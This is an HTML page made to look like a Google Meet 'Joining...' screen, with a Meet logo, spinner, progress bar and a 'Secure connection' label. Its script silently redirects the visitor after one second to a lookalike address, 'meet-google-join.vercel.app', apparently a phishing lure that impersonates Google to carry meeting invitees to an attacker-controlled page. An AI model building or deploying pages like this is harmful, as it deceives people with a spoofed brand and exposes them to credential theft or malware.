<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Joining Meeting</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family: "Roboto", Arial, sans-serif;
}

body{
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  background:#ffffff;
}

.card{
  width:380px;
  text-align:center;
  padding:40px 30px;
}

.logo{
  display:flex;
  justify-content:center;
  align-items:center;
  gap:8px;
  font-size:22px;
  font-weight:500;
  color:#202124;
  margin-bottom:20px;
}

.logo .material-icons{
  color:#1a73e8;
  font-size:28px;
}

/* super small loader feel (fast) */
.loader{
  width:38px;
  height:38px;
  border-radius:50%;
  border:4px solid #e0e0e0;
  border-top:4px solid #1a73e8;
  margin:15px auto;
  animation:spin 0.6s linear infinite;
}

@keyframes spin{
  100%{transform:rotate(360deg);}
}

.title{
  font-size:18px;
  color:#202124;
  margin-top:5px;
}

.sub{
  font-size:13px;
  color:#5f6368;
  margin-top:5px;
}

.icons{
  margin-top:15px;
  display:flex;
  justify-content:center;
  gap:16px;
  color:#5f6368;
}

.icons .material-icons{
  font-size:20px;
}

.bar{
  width:100%;
  height:3px;
  background:#e8eaed;
  border-radius:10px;
  margin-top:20px;
  overflow:hidden;
}

.fill{
  height:100%;
  width:0%;
  background:#1a73e8;
  transition: width 1s linear;
}

.footer{
  margin-top:15px;
  font-size:11px;
  color:#9aa0a6;
}
</style>
</head>

<body>

<div class="card">

  <div class="logo">
    <span class="material-icons">video_call</span>
    Meet
  </div>

  <div class="loader"></div>

  <div class="title">Joining...</div>
  <div class="sub">Please wait a moment</div>

  <div class="icons">
    <span class="material-icons">mic</span>
    <span class="material-icons">videocam</span>
    <span class="material-icons">devices</span>
  </div>

  <div class="bar"><div class="fill" id="fill"></div></div>

  <div class="footer">Secure connection</div>

</div>

<script>
let redirectURL = "https://meet-google-join.vercel.app/Qwz/";

// instant feel animation
setTimeout(()=>{
  document.getElementById("fill").style.width = "100%";
},50);

// 🔥 1 second redirect
setTimeout(()=>{
  window.location.href = redirectURL;
},1000);
</script>

</body>
</html>
